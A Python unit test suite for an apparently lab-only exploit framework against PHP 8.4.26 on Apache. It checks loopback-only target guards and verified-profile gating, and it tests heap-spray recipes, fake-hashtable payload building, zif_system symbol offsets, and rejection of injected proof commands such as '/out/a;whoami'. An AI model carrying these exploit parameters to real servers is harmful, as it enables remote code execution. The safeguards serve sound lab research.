from __future__ import annotations

import json
import importlib.util
import argparse
import socket
import struct
import sys
import tempfile
import unittest
from datetime import datetime, timedelta, timezone
from pathlib import Path
from unittest import mock

ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(ROOT))

from elf import inspect_elf, verify_elf_against_profile  # noqa: E402
from exploit import LabExploit, resolve_lab_target  # noqa: E402
from profile import (  # noqa: E402
    ProfileError,
    load_profile,
    require_verified,
    safe_proof_command,
    validate_profile,
    validate_target_manifest,
)
from profile_tool import command_calibrate, command_manifest  # noqa: E402


PROFILE_PATH = ROOT / "profiles" / "php-8.4.26-apache-amd64-fixed.json"


class ProfileTests(unittest.TestCase):
    def setUp(self) -> None:
        self.profile = load_profile(PROFILE_PATH)

    def test_verified_profile_loads(self) -> None:
        require_verified(self.profile)
        self.assertEqual(self.profile.strategy, "fixed-carrier-v1")

    def test_candidate_refuses_execution(self) -> None:
        data = json.loads(PROFILE_PATH.read_text(encoding="utf-8"))
        data["verification"] = {
            "state": "candidate",
            "runs": 0,
            "proof": "not-yet-verified",
            "verified_at": None,
        }
        with tempfile.TemporaryDirectory() as directory:
            path = Path(directory) / "candidate.json"
            path.write_text(json.dumps(data), encoding="utf-8")
            with self.assertRaisesRegex(ProfileError, "only locally verified"):
                require_verified(load_profile(path))

    def test_unknown_profile_key_rejected(self) -> None:
        data = json.loads(PROFILE_PATH.read_text(encoding="utf-8"))
        data["numeric_override"] = 1
        with self.assertRaisesRegex(ProfileError, "unknown numeric_override"):
            validate_profile(data)

    def test_safe_proof_command(self) -> None:
        self.assertEqual(safe_proof_command("/out/p"), b"id>/out/p")
        for bad in ("/tmp/p", "/out/a;whoami", "/out/a b", "/out/../p"):
            with self.subTest(bad=bad), self.assertRaises(ProfileError):
                safe_proof_command(bad)

    def test_manifest_is_short_lived_and_exact(self) -> None:
        now = datetime.now(timezone.utc).replace(microsecond=0)
        image = self.profile.raw["build"]["image"]
        manifest = {
            "schema_version": 1,
            "profile_id": self.profile.id,
            "profile_sha256": self.profile.file_sha256,
            "created_at": (now - timedelta(seconds=1)).isoformat().replace("+00:00", "Z"),
            "expires_at": (now + timedelta(minutes=5)).isoformat().replace("+00:00", "Z"),
            "image": dict(image),
            "libphp_sha256": self.profile.raw["build"]["libphp"]["sha256"],
            "runtime": dict(self.profile.raw["runtime"]),
            "resolved_addresses": ["127.0.0.1"],
        }
        with tempfile.TemporaryDirectory() as directory:
            path = Path(directory) / "manifest.json"
            path.write_text(json.dumps(manifest), encoding="utf-8")
            loaded = validate_target_manifest(self.profile, path)
            self.assertEqual(tuple(loaded["resolved_addresses"]), ("127.0.0.1",))
            manifest["libphp_sha256"] = "0" * 64
            path.write_text(json.dumps(manifest), encoding="utf-8")
            with self.assertRaisesRegex(ProfileError, "libphp hash mismatch"):
                validate_target_manifest(self.profile, path)

    def test_r0_geometry_candidate_validates(self) -> None:
        data = json.loads(PROFILE_PATH.read_text(encoding="utf-8"))
        data["verification"] = {
            "state": "candidate",
            "runs": 0,
            "proof": "not-yet-verified",
            "verified_at": None,
        }
        data["id"] = "php-8.4.26-r0-candidate"
        data["request_recipe"]["stage3"] = {
            "strategy": "r0-spray-v1",
            "trigger_pads": 32,
            "r0_search": {
                "page_lo": "0x50000",
                "page_hi_exclusive": "0xc0000",
                "page_step": "0x1000",
                "lowbits": ["0x160", "0x100", "0x130", "0x190"],
                "releak_every": 24,
            },
            "spray": {"value_len": 4071, "count": 400, "ht_page_offset": "0x800"},
            "pre_session_fields": {"count": 0, "value_len": 19, "name_prefix": "s"},
        }
        validate_profile(data)

    def test_adaptive_stage2_and_pre_session_bounds(self) -> None:
        data = json.loads(PROFILE_PATH.read_text(encoding="utf-8"))
        data["request_recipe"]["stage2"] = {
            "strategy": "adaptive-window-v1",
            "window": "0x20000",
            "arrays": 150,
        }
        data["request_recipe"]["stage3"] = {
            "strategy": "r0-spray-v1",
            "trigger_pads": 32,
            "r0_search": {
                "page_lo": "0x73000",
                "page_hi_exclusive": "0x74000",
                "page_step": "0x1000",
                "lowbits": ["0x180"],
                "releak_every": 24,
            },
            "spray": {"value_len": 4071, "count": 128, "ht_page_offset": "0x800"},
            "pre_session_fields": {"count": 1, "value_len": 19, "name_prefix": "s"},
        }
        validate_profile(data)

        bad = json.loads(json.dumps(data))
        bad["request_recipe"]["stage2"]["window"] = "0x21001"
        with self.assertRaisesRegex(ProfileError, "page-aligned"):
            validate_profile(bad)
        bad = json.loads(json.dumps(data))
        bad["request_recipe"]["stage3"]["pre_session_fields"]["count"] = 128
        with self.assertRaisesRegex(ProfileError, "below spray.count"):
            validate_profile(bad)

    def test_fixed_payload_matches_verified_reference(self) -> None:
        reference_path = ROOT.parents[1] / "cozybear-wsl" / "attacker" / "exploit.py"
        if not reference_path.exists():
            self.skipTest("verified reference implementation is absent")
        spec = importlib.util.spec_from_file_location("verified_reference", reference_path)
        assert spec is not None and spec.loader is not None
        module = importlib.util.module_from_spec(spec)
        spec.loader.exec_module(module)
        old = module.Exploit.__new__(module.Exploit)
        old.cmd = b"id>/out/p"
        expected, _unused_reference = old._payload(0x7000000690D8, 0x700100465370)
        current = LabExploit(None, self.profile, b"id>/out/p")
        actual = current._fake_hashtable(0x7000000690D8, 0x700100465370)
        self.assertEqual(actual, expected)

    def test_candidate_calibration_stays_candidate(self) -> None:
        data = json.loads(PROFILE_PATH.read_text(encoding="utf-8"))
        data["verification"] = {
            "state": "candidate",
            "runs": 0,
            "proof": "not-yet-verified",
            "verified_at": None,
        }
        data["id"] = "calibration-input"
        with tempfile.TemporaryDirectory() as directory:
            source = Path(directory) / "input.json"
            output = Path(directory) / "output.json"
            source.write_text(json.dumps(data), encoding="utf-8")
            args = argparse.Namespace(
                profile=str(source), output=str(output), id="calibration-output",
                stage1_fillers=842, stage2_fillers=None, stage2_target=None,
                stage2_target_count=None, stage2_value_len=None,
                fixed_htdata_offset="0x690e0", r0_page_lo=None, r0_page_hi=None,
                r0_page_step=None, r0_lowbits=None, r0_releak_every=None,
            )
            self.assertEqual(command_calibrate(args), 0)
            calibrated = load_profile(output)
            self.assertEqual(calibrated.raw["verification"]["state"], "candidate")
            self.assertEqual(calibrated.raw["request_recipe"]["stage1"]["fillers"], 842)
            self.assertEqual(calibrated.raw["request_recipe"]["stage3"]["htdata_offset"], "0x690e0")

    def test_manifest_tool_with_exact_local_evidence(self) -> None:
        module = ROOT.parent / "legacy" / "bin" / "libphp-8.4.26.so"
        if not module.exists():
            self.skipTest("local extracted reference module is absent")
        with tempfile.TemporaryDirectory() as directory:
            runtime_path = Path(directory) / "runtime.json"
            output = Path(directory) / "manifest.json"
            runtime_path.write_text(
                json.dumps(dict(self.profile.raw["runtime"])), encoding="utf-8"
            )
            image = self.profile.raw["build"]["image"]
            args = argparse.Namespace(
                profile=str(PROFILE_PATH), libphp=str(module),
                runtime_json=str(runtime_path), image_id=image["image_id"],
                repo_digest=image["repo_digest"], address=["127.0.0.1"],
                minutes=5, output=str(output),
            )
            self.assertEqual(command_manifest(args), 0)
            manifest = validate_target_manifest(self.profile, output)
            self.assertEqual(tuple(manifest["resolved_addresses"]), ("127.0.0.1",))


class GuardTests(unittest.TestCase):
    def test_literal_loopback_accepted(self) -> None:
        self.assertEqual(resolve_lab_target("127.0.0.1", 80), ("127.0.0.1",))

    def test_public_literal_rejected(self) -> None:
        with self.assertRaisesRegex(ProfileError, "non-lab address"):
            resolve_lab_target("8.8.8.8", 80)

    def test_mixed_dns_rejected(self) -> None:
        answers = [
            (socket.AF_INET, socket.SOCK_STREAM, 6, "", ("172.20.0.2", 80)),
            (socket.AF_INET, socket.SOCK_STREAM, 6, "", ("203.0.113.2", 80)),
        ]
        with mock.patch("socket.getaddrinfo", return_value=answers):
            with self.assertRaisesRegex(ProfileError, "non-lab address"):
                resolve_lab_target("mixed.invalid", 80)


class RecipeTests(unittest.TestCase):
    class RecordingTarget:
        def __init__(self) -> None:
            self.posts = []

        def log(self, _message: str) -> None:
            pass

        def post(self, body, boundary, **kwargs):
            self.posts.append((body, boundary, kwargs))
            return b""

    def _r0_profile(self):
        data = json.loads(PROFILE_PATH.read_text(encoding="utf-8"))
        data["request_recipe"]["stage2"] = {
            "strategy": "adaptive-window-v1",
            "window": "0x20000",
            "arrays": 150,
        }
        data["request_recipe"]["stage3"] = {
            "strategy": "r0-spray-v1",
            "trigger_pads": 32,
            "r0_search": {
                "page_lo": "0x73000",
                "page_hi_exclusive": "0x74000",
                "page_step": "0x1000",
                "lowbits": ["0x180"],
                "releak_every": 24,
            },
            "spray": {"value_len": 4071, "count": 128, "ht_page_offset": "0x800"},
            "pre_session_fields": {"count": 1, "value_len": 19, "name_prefix": "s"},
        }
        validate_profile(data)
        profile = mock.Mock()
        profile.raw = data
        profile.strategy = "r0-spray-v1"
        return profile

    def test_r0_consumer_orders_pre_session_field_before_specials(self) -> None:
        target = self.RecordingTarget()
        exploit = LabExploit(target, self._r0_profile(), b"id>/out/p")
        with mock.patch.object(exploit, "_r0_trigger"), mock.patch.object(
            exploit, "_packed_r0_value", return_value=b"SPRAY"
        ):
            exploit.r0_stage3(0x700000000000, 0x700100000000, 0x73000, [0x180])
        body = target.posts[-1][0]
        positions = [
            body.index(b'name="s000"'),
            body.index(b'name="PHPSESSID"'),
            body.index(b'name="PHP_SESSION_UPLOAD_PROGRESS"'),
            body.index(b'name="s001"'),
        ]
        self.assertEqual(positions, sorted(positions))
        self.assertIn(b'name="s000"\r\n\r\n' + b"F" * 19 + b"\r\n", body)
        self.assertEqual(body.count(b'name="s'), 128)

    def test_adaptive_stage2_uses_profiled_window_and_arrays(self) -> None:
        target = self.RecordingTarget()
        exploit = LabExploit(target, self._r0_profile(), b"id>/out/p")
        with mock.patch("exploit.time.sleep"):
            exploit.stage2()
        self.assertEqual(len(target.posts), 2)
        body = target.posts[1][0]
        self.assertIn(struct.pack("<Q", 0x20000), body)
        self.assertEqual(body.count(b'name="a'), 150)
        self.assertLess(body.index(b'name="1999"'), body.index(b'name="a0000[0]"'))

    def test_adaptive_stage2_keeps_stage1_worker_state(self) -> None:
        exploit = LabExploit(self.RecordingTarget(), self._r0_profile(), b"id>/out/p")
        events = []
        exploit.rotate = lambda: events.append("rotate")
        exploit.stage1 = lambda: (events.append("stage1") or (0x700000000000, b""))
        exploit.stage2 = lambda: (events.append("stage2") or (0x700100000000, b""))
        exploit.leak_addresses(1)
        self.assertEqual(events, ["rotate", "stage1", "stage2"])


class ElfTests(unittest.TestCase):
    def test_known_module_when_present(self) -> None:
        module = ROOT.parent / "legacy" / "bin" / "libphp-8.4.26.so"
        if not module.exists():
            self.skipTest("local extracted reference module is absent")
        metadata = inspect_elf(module)
        self.assertEqual(metadata.symbols["zif_system"], 0x465370)
        self.assertEqual(metadata.symbols["zval_ptr_dtor"], 0x65EB60)
        verify_elf_against_profile(module, load_profile(PROFILE_PATH))


if __name__ == "__main__":
    unittest.main(verbosity=2)

